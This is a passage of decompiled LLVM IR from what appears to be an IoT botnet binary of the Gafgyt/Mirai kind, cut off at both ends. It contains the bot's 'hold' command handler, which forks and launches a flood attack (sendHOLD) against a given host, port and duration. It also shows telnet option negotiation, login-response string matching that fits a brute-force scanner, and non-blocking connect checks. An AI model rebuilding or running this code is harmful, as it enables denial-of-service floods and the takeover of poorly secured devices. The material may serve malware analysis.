  store i32 %v2_80504df, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80504e6 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v3_80504f4 = add i32 %v2_80503f4, %v2_8050399
  %v4_80504f4 = inttoptr i32 %v3_80504f4 to i32*
  %v5_80504f4 = load i32, i32* %v4_80504f4, align 8
  %v2_80504f9 = udiv i32 %v5_80504f4, 32
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_8050502 = load i32, i32* %v4_80504f4, align 8
  %v1_8050505 = urem i32 %v5_8050502, 32
  store i32 %v1_8050505, i32* %eax.global-to-local, align 4
  %v0_8050508 = load i32, i32* @ebp, align 4
  %v2_8050508 = mul nuw nsw i32 %v2_80504f9, 4
  %v3_8050508 = add nsw i32 %v2_8050508, -188
  %v4_8050508 = add i32 %v3_8050508, %v0_8050508
  %v5_8050508 = inttoptr i32 %v4_8050508 to i32*
  %v6_8050508 = load i32, i32* %v5_8050508, align 4
  %v9_8050508 = shl i32 1, %v1_8050505
  %v12_8050508 = or i32 %v6_8050508, %v9_8050508
  store i32 %v12_8050508, i32* %v5_8050508, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_805052a = load i32, i32* %v4_80504f4, align 8
  %v1_805052d = add i32 %v5_805052a, 1
  store i32 %v1_805052d, i32* %edx.global-to-local, align 4
  %v0_8050530 = load i32, i32* @esp, align 4
  %v2_8050539 = add i32 %v0_8050530, -16
  %v3_8050539 = inttoptr i32 %v2_8050539 to i32*
  store i32 %v2_8050533, i32* %v3_8050539, align 4
  %v1_805053a = add i32 %v0_8050530, -20
  %v2_805053a = inttoptr i32 %v1_805053a to i32*
  store i32 0, i32* %v2_805053a, align 4
  store i32 %v2_80504df, i32* %eax.global-to-local, align 4
  %v2_8050542 = add i32 %v0_8050530, -24
  %v3_8050542 = inttoptr i32 %v2_8050542 to i32*
  store i32 %v2_80504df, i32* %v3_8050542, align 4
  %v1_8050543 = add i32 %v0_8050530, -28
  %v2_8050543 = inttoptr i32 %v1_8050543 to i32*
  store i32 0, i32* %v2_8050543, align 4
  %v0_8050545 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050545 = add i32 %v0_8050530, -32
  %v3_8050545 = inttoptr i32 %v2_8050545 to i32*
  store i32 %v0_8050545, i32* %v3_8050545, align 4
  %v0_8050546 = load i32, i32* %stack_var_-200, align 4
  %v2_8050546 = load i32, i32* %stack_var_-192, align 4
  %v5_8050546 = call i32 @__libc_select(i32 %v0_8050546, i32 10000, i32 %v2_8050546, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050546, i32* %eax.global-to-local, align 4
  %v0_805054b = load i32, i32* @esp, align 4
  %v12_8050551 = icmp eq i32 %v5_8050546, 1
  %v1_8050555 = icmp eq i1 %v12_8050551, false
  br i1 %v1_8050555, label %dec_label_pc_80505c7, label %dec_label_pc_8050557

dec_label_pc_8050557:                             ; preds = %dec_label_pc_80504d5
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_8050567 = load i32, i32* %v4_80504f4, align 8
  store i32 %v5_8050567, i32* %edx.global-to-local, align 4
  %v2_8050573 = add i32 %v0_805054b, 16
  %v3_8050573 = inttoptr i32 %v2_8050573 to i32*
  store i32 %v2_805056d, i32* %v3_8050573, align 4
  store i32 %v2_8050574, i32* %eax.global-to-local, align 4
  %v2_805057a = add i32 %v0_805054b, 12
  %v3_805057a = inttoptr i32 %v2_805057a to i32*
  store i32 %v2_8050574, i32* %v3_805057a, align 4
  %v1_805057b = add i32 %v0_805054b, 8
  %v2_805057b = inttoptr i32 %v1_805057b to i32*
  store i32 4, i32* %v2_805057b, align 4
  %v1_805057d = add i32 %v0_805054b, 4
  %v2_805057d = inttoptr i32 %v1_805057d to i32*
  store i32 1, i32* %v2_805057d, align 4
  %v0_805057f = load i32, i32* %edx.global-to-local, align 4
  %v3_805057f = inttoptr i32 %v0_805054b to i32*
  store i32 %v0_805057f, i32* %v3_805057f, align 4
  %v0_8050580 = load i32, i32* %stack_var_-204, align 4
  %v1_8050580 = call i32 @getsockopt(i32 %v0_8050580)
  %v0_8050585 = load i32, i32* @esp, align 4
  %v3_8050588 = load i32, i32* %stack_var_-208, align 4
  %v1_805058e = icmp eq i32 %v3_8050588, 0
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  br i1 %v1_805058e, label %dec_label_pc_80505b7, label %dec_label_pc_8050592

dec_label_pc_8050592:                             ; preds = %dec_label_pc_8050557
  %v5_8050598 = load i32, i32* %v4_80504f4, align 8
  store i32 %v5_8050598, i32* %eax.global-to-local, align 4
  %v2_805059e = add i32 %v0_8050585, 16
  %v3_805059e = inttoptr i32 %v2_805059e to i32*
  store i32 %v5_8050598, i32* %v3_805059e, align 4
  %v0_805059f = load i32, i32* %stack_var_-204, align 4
  %v1_805059f = call i32 @close(i32 %v0_805059f)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80503f4, align 4
  br label %dec_label_pc_8050698

dec_label_pc_80505b7:                             ; preds = %dec_label_pc_8050557
  store i8 2, i8* %v5_80503f4, align 4
  br label %dec_label_pc_8050698

dec_label_pc_80505c7:                             ; preds = %dec_label_pc_80504d5
  %v13_80505c7 = icmp eq i32 %v5_8050546, -1
  %v1_80505cb = icmp eq i1 %v13_80505c7, false
  br i1 %v1_80505cb, label %dec_label_pc_8050698, label %dec_label_pc_80505d1

dec_label_pc_80505d1:                             ; preds = %dec_label_pc_80505c7
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_80505d7 = load i32, i32* %v4_80504f4, align 8
  store i32 %v5_80505d7, i32* %eax.global-to-local, align 4
  %v2_80505dd = add i32 %v0_805054b, 16
  %v3_80505dd = inttoptr i32 %v2_80505dd to i32*
  store i32 %v5_80505d7, i32* %v3_80505dd, align 4
  %v1_80505de = call i32 @close(i32 %v5_8050546)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80503f4, align 4
  br label %dec_label_pc_8050698

dec_label_pc_80505f6:                             ; preds = %dec_label_pc_8050412
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80504df, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8050607 = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v3_8050615 = add i32 %v2_80503f4, %v2_8050399
  %v4_8050615 = inttoptr i32 %v3_8050615 to i32*
  %v5_8050615 = load i32, i32* %v4_8050615, align 8
  %v2_805061a = udiv i32 %v5_8050615, 32
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_8050623 = load i32, i32* %v4_8050615, align 8
  %v1_8050626 = urem i32 %v5_8050623, 32
  store i32 %v1_8050626, i32* %eax.global-to-local, align 4
  %v0_8050629 = load i32, i32* @ebp, align 4
  %v2_8050629 = mul nuw nsw i32 %v2_805061a, 4
  %v3_8050629 = add nsw i32 %v2_8050629, -188
  %v4_8050629 = add i32 %v3_8050629, %v0_8050629
  %v5_8050629 = inttoptr i32 %v4_8050629 to i32*
  %v6_8050629 = load i32, i32* %v5_8050629, align 4
  %v9_8050629 = shl i32 1, %v1_8050626
  %v12_8050629 = or i32 %v6_8050629, %v9_8050629
  store i32 %v12_8050629, i32* %v5_8050629, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_805064b = load i32, i32* %v4_8050615, align 8
  %v1_805064e = add i32 %v5_805064b, 1
  store i32 %v1_805064e, i32* %edx.global-to-local, align 4
  %v0_8050651 = load i32, i32* @esp, align 4
  %v2_805065a = add i32 %v0_8050651, -16
  %v3_805065a = inttoptr i32 %v2_805065a to i32*
  store i32 %v2_8050533, i32* %v3_805065a, align 4
  store i32 %v2_80504df, i32* %eax.global-to-local, align 4
  %v2_8050661 = add i32 %v0_8050651, -20
  %v3_8050661 = inttoptr i32 %v2_8050661 to i32*
  store i32 %v2_80504df, i32* %v3_8050661, align 4
  %v1_8050662 = add i32 %v0_8050651, -24
  %v2_8050662 = inttoptr i32 %v1_8050662 to i32*
  store i32 0, i32* %v2_8050662, align 4
  %v1_8050664 = add i32 %v0_8050651, -28
  %v2_8050664 = inttoptr i32 %v1_8050664 to i32*
  store i32 0, i32* %v2_8050664, align 4
  %v0_8050666 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050666 = add i32 %v0_8050651, -32
  %v3_8050666 = inttoptr i32 %v2_8050666 to i32*
  store i32 %v0_8050666, i32* %v3_8050666, align 4
  %v0_8050667 = load i32, i32* %stack_var_-200, align 4
  %v2_8050667 = load i32, i32* %stack_var_-192, align 4
  %v5_8050667 = call i32 @__libc_select(i32 %v0_8050667, i32 10000, i32 %v2_8050667, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050667, i32* %eax.global-to-local, align 4
  %v4_8050672 = icmp eq i32 %v5_8050667, 0
  br i1 %v4_8050672, label %dec_label_pc_8050698, label %dec_label_pc_8050678

dec_label_pc_8050678:                             ; preds = %dec_label_pc_80505f6
  %v0_805066c = load i32, i32* @esp, align 4
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v5_805067e = load i32, i32* %v4_8050615, align 8
  store i32 %v5_805067e, i32* %eax.global-to-local, align 4
  %v2_8050684 = add i32 %v0_805066c, 16
  %v3_8050684 = inttoptr i32 %v2_8050684 to i32*
  store i32 %v5_805067e, i32* %v3_8050684, align 4
  %v1_8050685 = call i32 @close(i32 %v5_8050667)
  store i32 %storemerge44, i32* %edx.global-to-local, align 4
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_80503f4, align 4
  br label %dec_label_pc_8050698

dec_label_pc_8050698:                             ; preds = %dec_label_pc_805041f, %dec_label_pc_80505f6, %dec_label_pc_80505c7, %dec_label_pc_80505d1, %dec_label_pc_80505b7, %dec_label_pc_8050592, %dec_label_pc_80504c5, %dec_label_pc_80504ab, %dec_label_pc_8050678
  %v4_8050698 = add nuw nsw i32 %storemerge44, 1
  store i32 %v4_8050698, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8050698, %v2_805031f
  br i1 %exitcond, label %dec_label_pc_805069b.dec_label_pc_80506a7.loopexit_crit_edge, label %dec_label_pc_80503ee

dec_label_pc_805069b.dec_label_pc_80506a7.loopexit_crit_edge: ; preds = %dec_label_pc_8050698
  %v0_80506a7.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80506a7

dec_label_pc_80506a7:                             ; preds = %dec_label_pc_805069b.preheader, %dec_label_pc_805069b.dec_label_pc_80506a7.loopexit_crit_edge, %dec_label_pc_8050360
  %v0_80506a7 = phi i32 [ %v1_80503d4, %dec_label_pc_8050360 ], [ %v0_80506a7.pre.pre, %dec_label_pc_805069b.dec_label_pc_80506a7.loopexit_crit_edge ], [ %v1_80506b1, %dec_label_pc_805069b.preheader ]
  %stack_var_-40.0 = phi i32 [ %tmp10, %dec_label_pc_8050360 ], [ %v2_805031f, %dec_label_pc_805069b.dec_label_pc_80506a7.loopexit_crit_edge ], [ 0, %dec_label_pc_805069b.preheader ]
  %v1_80506aa = add i32 %v0_80506a7, -16
  %v2_80506aa = inttoptr i32 %v1_80506aa to i32*
  store i32 0, i32* %v2_80506aa, align 4
  %v1_80506ac = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_80506ac = call i32 @__GI_time(i32* %v1_80506ac)
  store i32 %v2_80506ac, i32* %eax.global-to-local, align 4
  %v5_80506b7 = icmp slt i32 %v2_80506ac, %v5_80503d7
  br i1 %v5_80506b7, label %dec_label_pc_805069b.preheader, label %dec_label_pc_80506bd

dec_label_pc_805069b.preheader:                   ; preds = %dec_label_pc_80506a7
  %v0_80506b1 = load i32, i32* @esp, align 4
  %v1_80506b1 = add i32 %v0_80506b1, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_80506a143, label %dec_label_pc_80503ee, label %dec_label_pc_80506a7

dec_label_pc_80506bd:                             ; preds = %dec_label_pc_80506a7, %entry
  %v0_80506c9 = phi i32 [ %v3_805034f, %entry ], [ %v2_80506ac, %dec_label_pc_80506a7 ]
  ret i32 %v0_80506c9

; uselistorder directives
  uselistorder i32 %v4_8050698, { 1, 2, 0 }
  uselistorder i32 %v1_8050626, { 1, 0 }
  uselistorder i32 %v0_805054b, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_8050546, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050505, { 1, 0 }
  uselistorder i32* %v4_80504f4, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v12_8050464, { 1, 0 }
  uselistorder i32 %v0_805045f, { 2, 0, 1 }
  uselistorder i32 %v7_80503f4, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i8* %v5_80503f4, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge44, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 22, 0, 1 }
  uselistorder i32 %v2_80504df, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_80503b6, { 1, 0 }
  uselistorder i32 %v2_8050399, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 5, 4 }
  uselistorder i32 %v2_8050388, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805032d, { 1, 0 }
  uselistorder i32 %v2_805031f, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8050311, { 1, 0, 2 }
  uselistorder i32 %v12_8050303, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-200, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 0, 45, 44, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder label %dec_label_pc_8050698, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_80506d5 = icmp sgt i32 %arg3, 2
  br i1 %v7_80506d5, label %dec_label_pc_80506d7, label %entry.dec_label_pc_80506ef_crit_edge

entry.dec_label_pc_80506ef_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80506ef

dec_label_pc_80506d7:                             ; preds = %entry
  %v1_80506da = add i32 %arg4, 12
  %v1_80506dd = inttoptr i32 %v1_80506da to i32*
  %v2_80506dd = load i32, i32* %v1_80506dd, align 4
  %v1_80506e3 = call i32 @atol(i32 %v2_80506dd)
  store i32 %v1_80506e3, i32* @eax, align 4
  %v2_80506eb = icmp slt i32 %v1_80506e3, 0
  %v1_80506ed = icmp eq i1 %v2_80506eb, false
  br i1 %v1_80506ed, label %dec_label_pc_8050707, label %dec_label_pc_80506ef

dec_label_pc_80506ef:                             ; preds = %entry.dec_label_pc_80506ef_crit_edge, %dec_label_pc_80506d7
  %v3_80506fd = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806a1e4.260 to i32))
  br label %dec_label_pc_8050783

dec_label_pc_8050707:                             ; preds = %dec_label_pc_80506d7
  %v1_805070d = call i32 @mfork(i32 %arg2)
  %v1_8050715 = icmp eq i32 %v1_805070d, 0
  %v1_8050717 = icmp eq i1 %v1_8050715, false
  br i1 %v1_8050717, label %dec_label_pc_8050783, label %dec_label_pc_8050719

dec_label_pc_8050719:                             ; preds = %dec_label_pc_8050707
  %v1_805071c = add i32 %arg4, 8
  %v1_805071f = inttoptr i32 %v1_805071c to i32*
  %v1_8050724 = add i32 %arg4, 4
  %v1_8050727 = inttoptr i32 %v1_8050724 to i32*
  %v3_8050739 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a208.261 to i32))
  %v2_8050747 = load i32, i32* %v1_80506dd, align 4
  %v1_805074d = call i32 @atol(i32 %v2_8050747)
  store i32 %v1_805074d, i32* @ebx, align 4
  %v2_805075d = load i32, i32* %v1_805071f, align 4
  %v1_8050763 = call i32 @atol(i32 %v2_805075d)
  %v2_8050773 = load i32, i32* %v1_8050727, align 4
  %v0_8050778 = load i32, i32* @ebx, align 4
  %v4_805077b = call i32 @sendHOLD(i32 %v2_8050773, i32 %v1_8050763, i32 %v0_8050778)
  br label %dec_label_pc_8050783

dec_label_pc_8050783:                             ; preds = %dec_label_pc_8050707, %dec_label_pc_80506ef, %dec_label_pc_8050719
  %v0_8050787 = phi i32 [ %v1_805070d, %dec_label_pc_8050707 ], [ %v3_80506fd, %dec_label_pc_80506ef ], [ %v4_805077b, %dec_label_pc_8050719 ]
  ret i32 %v0_8050787

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050783, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80506ef, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050788 = load i32, i32* @ebp, align 4
  store i32 %v0_8050788, i32* %stack_var_-4, align 4
  %v4_8050788 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8050788, i32* @ebp, align 4
  %v1_8050791 = add i32 %arg2, 1
  %v1_8050792 = inttoptr i32 %v1_8050791 to i8*
  %v2_8050792 = load i8, i8* %v1_8050792, align 1
  %v5_8050792 = and i32 %v1_8050791, -256
  %v9_805079e = icmp ult i8 %v2_8050792, -5
  br i1 %v9_805079e, label %dec_label_pc_805087e, label %dec_label_pc_80507ab

dec_label_pc_80507ab:                             ; preds = %entry
  %v7_80507b2 = icmp eq i8 %v2_8050792, -1
  br i1 %v7_80507b2, label %dec_label_pc_80507b4, label %dec_label_pc_80507ce

dec_label_pc_80507b4:                             ; preds = %dec_label_pc_80507ab
  br label %dec_label_pc_805087e

dec_label_pc_80507ce:                             ; preds = %dec_label_pc_80507ab
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_80507d9 = ptrtoint i32* %stack_var_-5 to i32
  %v4_80507e0 = call i32 @send(i32 %arg1, i32 %v2_80507d9, i32 1, i32 16384)
  %v2_80507ec = load i8, i8* %v1_8050792, align 1
  %v11_80507ee = icmp eq i8 %v2_80507ec, -4
  %v1_80507f0 = icmp eq i1 %v11_80507ee, false
  br i1 %v1_80507f0, label %dec_label_pc_80507f8, label %dec_label_pc_80507f2

dec_label_pc_80507f2:                             ; preds = %dec_label_pc_80507ce
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8050848

dec_label_pc_80507f8:                             ; preds = %dec_label_pc_80507ce
  %v2_80507fc = load i8, i8* %v1_8050792, align 1
  %v11_80507fe = icmp eq i8 %v2_80507fc, -2
  %v1_8050800 = icmp eq i1 %v11_80507fe, false
  br i1 %v1_8050800, label %dec_label_pc_8050808, label %dec_label_pc_8050802

dec_label_pc_8050802:                             ; preds = %dec_label_pc_80507f8
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8050848

dec_label_pc_8050808:                             ; preds = %dec_label_pc_80507f8
  %v2_805080c = load i8, i8* %v1_8050792, align 1
  %v10_805080e = icmp eq i8 %v2_805080c, 3
  %v1_8050810 = icmp eq i1 %v10_805080e, false
  %v11_8050834 = icmp eq i8 %v2_805080c, -3
  %v1_8050836 = icmp eq i1 %v11_8050834, false
  br i1 %v1_8050810, label %dec_label_pc_805082e, label %dec_label_pc_8050812

dec_label_pc_8050812:                             ; preds = %dec_label_pc_8050808
  %. = select i1 %v1_8050836, i32 253, i32 251
  %v7_8050826 = or i32 %., %v5_8050792
  store i32 %v7_8050826, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8050848

dec_label_pc_805082e:                             ; preds = %dec_label_pc_8050808
  %.2 = select i1 %v1_8050836, i32 254, i32 252
  %v5_8050842 = load i32, i32* @edx, align 4
  %v6_8050842 = and i32 %v5_8050842, -256
  %v7_8050842 = or i32 %v6_8050842, %.2
  store i32 %v7_8050842, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8050848

dec_label_pc_8050848:                             ; preds = %dec_label_pc_8050812, %dec_label_pc_8050802, %dec_label_pc_80507f2, %dec_label_pc_805082e
  %v4_8050856 = call i32 @send(i32 %arg1, i32 %v2_80507d9, i32 1, i32 16384)
  %v1_8050861 = add i32 %arg2, 2
  %v4_805086f = call i32 @send(i32 %arg1, i32 %v1_8050861, i32 1, i32 16384)
  br label %dec_label_pc_805087e

dec_label_pc_805087e:                             ; preds = %dec_label_pc_80507b4, %dec_label_pc_8050848, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 251, { 1, 0 }
  uselistorder i32 253, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805087e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050848, { 3, 0, 1, 2 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8050883 = load i32, i32* @ebp, align 4
  store i32 %v0_8050883, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %dec_label_pc_805089e, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_805089e, %dec_label_pc_805089e ]
  %v4_805089e = add i32 %stack_var_-12.0, 1
  %v2_80508a4 = mul i32 %v4_805089e, 4
  %v5_80508a7 = add i32 %v2_80508a4, %tmp5
  %v1_80508aa = inttoptr i32 %v5_80508a7 to i32*
  %v2_80508aa = load i32, i32* %v1_80508aa, align 4
  %v1_80508ac = icmp eq i32 %v2_80508aa, 0
  %v1_80508ae = icmp eq i1 %v1_80508ac, false
  br i1 %v1_80508ae, label %dec_label_pc_805089e, label %dec_label_pc_80508e3.preheader

dec_label_pc_80508e3.preheader:                   ; preds = %dec_label_pc_805089e
  %v2_80508cb = inttoptr i32 %arg1 to i8*
  %v5_80508e919 = icmp sgt i32 %v4_805089e, 0
  br i1 %v5_80508e919, label %dec_label_pc_80508b9.lr.ph, label %dec_label_pc_80508f2

dec_label_pc_80508b9.lr.ph:                       ; preds = %dec_label_pc_80508e3.preheader
  br label %dec_label_pc_80508b9

dec_label_pc_80508b9:                             ; preds = %dec_label_pc_80508b9.lr.ph, %dec_label_pc_80508e0
  %storemerge120 = phi i32 [ 0, %dec_label_pc_80508b9.lr.ph ], [ %v4_80508e0, %dec_label_pc_80508e0 ]
  %v2_80508bc = mul i32 %storemerge120, 4
  %v5_80508bf = add i32 %v2_80508bc, %tmp5
  %v1_80508c2 = inttoptr i32 %v5_80508bf to i32*
  %v2_80508c2 = load i32, i32* %v1_80508c2, align 4
  store i32 %v2_80508c2, i32* @eax, align 4
  %v3_80508cb = call i32 @strcasestr(i8* %v2_80508cb, i32 %v2_80508c2)
  %v1_80508d3 = icmp eq i32 %v3_80508cb, 0
  br i1 %v1_80508d3, label %dec_label_pc_80508e0, label %dec_label_pc_80508f2

dec_label_pc_80508e0:                             ; preds = %dec_label_pc_80508b9
  %v4_80508e0 = add nuw nsw i32 %storemerge120, 1
  %v5_80508e9 = icmp slt i32 %v4_80508e0, %v4_805089e
  br i1 %v5_80508e9, label %dec_label_pc_80508b9, label %dec_label_pc_80508f2

dec_label_pc_80508f2:                             ; preds = %dec_label_pc_80508b9, %dec_label_pc_80508e0, %dec_label_pc_80508e3.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_80508e3.preheader ], [ 0, %dec_label_pc_80508e0 ], [ 1, %dec_label_pc_80508b9 ]
  %v2_80508f5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80508f5, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge120, { 1, 0 }
  uselistorder i32 %v4_805089e, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80508f2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80508b9, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8050908 = call i32 @contains_string(i32 %arg1, i32* bitcast ([5 x i8*]* @global_var_806f6c0.267 to i32*))
  ret i32 %v4_8050908
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8050923 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_806f6a0.275 to i32*))
  ret i32 %v4_8050923
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8050939 = call i32 @contains_success(i32 %arg1)
  %v1_8050941 = icmp eq i32 %v1_8050939, 0
  %v1_8050943 = icmp eq i1 %v1_8050941, false
  br i1 %v1_8050943, label %dec_label_pc_8050967, label %dec_label_pc_8050945

dec_label_pc_8050945:                             ; preds = %entry
  %v1_805094b = call i32 @contains_fail(i32 %arg1)
  %v1_8050953 = icmp ne i32 %v1_805094b, 0
  %. = zext i1 %v1_8050953 to i32
  br label %dec_label_pc_8050967

dec_label_pc_8050967:                             ; preds = %dec_label_pc_8050945, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8050945 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805096f = load i32, i32* @edi, align 4
  store i32 %v0_805096f, i32* %stack_var_-8, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8050993 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i32 %v2_8050993, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805099a = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_80509a7 = udiv i32 %arg1, 32
  %v1_80509ad = urem i32 %arg1, 32
  %v0_80509b0 = load i32, i32* @ebp, align 4
  %v2_80509b0 = mul nuw nsw i32 %v2_80509a7, 4
  %v3_80509b0 = add nsw i32 %v2_80509b0, -140
  %v4_80509b0 = add i32 %v3_80509b0, %v0_80509b0
  %v5_80509b0 = inttoptr i32 %v4_80509b0 to i32*
  %v6_80509b0 = load i32, i32* %v5_80509b0, align 4
  %v9_80509b0 = shl i32 1, %v1_80509ad
  %v12_80509b0 = or i32 %v6_80509b0, %v9_80509b0
  store i32 %v12_80509b0, i32* %v5_80509b0, align 4
  %v1_80509bb = add i32 %arg1, 1
  %v2_80509bf = ptrtoint i32* %stack_var_-152 to i32
  %v5_80509d2 = call i32 @__libc_select(i32 %v1_80509bb, i32 %v2_8050993, i32 0, i32 0, i32 %v2_80509bf)
  %tmp22 = icmp slt i32 %v5_80509d2, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_80509ea, label %dec_label_pc_8050a04

dec_label_pc_80509ea:                             ; preds = %entry
  %v4_80509f6 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8050a04

dec_label_pc_8050a04:                             ; preds = %entry, %dec_label_pc_80509ea
  %storemerge = phi i32 [ %v4_80509f6, %dec_label_pc_80509ea ], [ 0, %entry ]
  %v3_8050a0a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8050a0a, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050a04, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
